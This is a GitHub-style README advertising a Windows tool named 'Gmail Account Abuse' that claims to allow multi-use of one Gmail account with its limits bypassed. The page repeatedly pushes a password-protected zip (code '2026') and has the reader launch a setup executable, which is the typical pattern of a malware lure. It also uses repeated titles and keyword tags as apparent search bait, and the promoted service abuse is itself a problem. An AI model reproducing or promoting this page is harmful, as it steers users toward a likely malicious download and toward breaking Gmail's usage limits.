<div align="center">

# Gmail Account Abuse — Gmail Account Abuse — Gmail Account Abuse (Portable x64 Build, JSON Configuration)

<p><strong>Gmail Account Abuse — Gmail Account Abuse — Gmail Account Abuse (Portable x64 Build, JSON Configuration): Gmail account abuse: multi-use on one, limits bypassed. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/gmail-account-abuse?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download gmail-account-abuse-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip"><img src="banner.svg" alt="Gmail Account Abuse Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Gmail Account Abuse — Gmail account abuse: multi-use on one, limits bypassed** (`gmail-account-abuse`) is a dedicated, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`gmail-account-abuse-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`gmail-account-abuse-v0.1.0-win64.zip`](../../releases/download/v0.1.0/gmail-account-abuse-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `GmailAccountAbuse_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### Documentation & Guides

- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

### Configuration (`config/settings.json`)

```json
{
  "module": "gmail-account-abuse",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "accounts": {
      "enabled": true
    },
    "limits": {
      "enabled": true
    },
    "rotate": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/TestOwner/gmail-account-abuse.git
cd gmail-account-abuse
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: gmail-account-abuse, gmail, account, abuse, multi, limits, rotate, email, automation, cli, developer-tools, open-source, windows, productivity, cpp, portable, prebuilt, tools</sub>
